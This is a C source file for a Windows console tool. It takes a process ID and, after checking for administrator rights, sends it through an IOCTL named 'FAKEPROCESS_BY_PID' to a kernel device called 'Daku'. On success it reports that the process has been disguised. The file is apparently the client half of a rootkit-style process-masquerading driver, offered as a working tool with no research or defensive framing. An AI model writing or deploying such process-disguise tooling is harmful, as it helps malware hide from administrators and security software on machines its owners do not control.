#include <windows.h>
#include <stdio.h>
#include <conio.h>

#define COLOR_RED "\033[31m"
#define COLOR_GREEN "\033[32m"
#define COLOR_RESET "\033[0m"

#define CTL_CODE_FAKEPROCESS_BY_PID CTL_CODE(0x8000,0x801,0,0)
#define DEVICE_LINK_NAME L"\\\\.\\Daku"

void EnableVirtualTerminalProcessing() {
    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    DWORD dwMode = 0;
    GetConsoleMode(hOut, &dwMode);
    dwMode |= ENABLE_VIRTUAL_TERMINAL_PROCESSING;
    SetConsoleMode(hOut, dwMode);
}

bool DisguiseProcess(DWORD dwPid) {
    HANDLE hDevice = CreateFileW(
        DEVICE_LINK_NAME,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hDevice == INVALID_HANDLE_VALUE) {
        return false;
    }

    DWORD dwBytesReturned = 0;
    HANDLE hPid = (HANDLE)(ULONG_PTR)dwPid;
    
    BOOL bResult = DeviceIoControl(
        hDevice,
        CTL_CODE_FAKEPROCESS_BY_PID,
        &hPid,
        sizeof(HANDLE),
        NULL,
        0,
        &dwBytesReturned,
        NULL
    );

    CloseHandle(hDevice);
    return bResult ? true : false;
}

int main() {
    EnableVirtualTerminalProcessing();
    
    BOOL isAdmin = FALSE;
    PSID administratorsGroup = NULL;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    
    if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
                                  DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0,
                                  &administratorsGroup)) {
        CheckTokenMembership(NULL, administratorsGroup, &isAdmin);
        FreeSid(administratorsGroup);
    }
    
    if (!isAdmin) {
        printf(COLOR_RED "Run as Administrator!\n" COLOR_RESET);
        printf("\nPress any key to exit...");
        _getch();
        return 1;
    }

    DWORD targetPid = 0;
    printf(COLOR_RED "Enter Process ID: " COLOR_RESET);
    
    if (scanf_s("%lu", &targetPid) != 1 || targetPid == 0) {
        printf("Invalid PID\n");
        printf("\nPress any key to exit...");
        _getch();
        return 1;
    }

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, targetPid);
    if (!hProcess) {
        printf("Cannot access process\n");
        printf("\nPress any key to exit...");
        _getch();
        return 1;
    }
    CloseHandle(hProcess);

    if (DisguiseProcess(targetPid)) {
        printf(COLOR_GREEN "Disguise successful - PID: %lu\n" COLOR_RESET, targetPid);
        printf("\nPress any key to exit...");
        _getch();
        return 0;
    } else {
        printf("Disguise failed\n");
        printf("\nPress any key to exit...");
        _getch();
        return 1;
    }
}
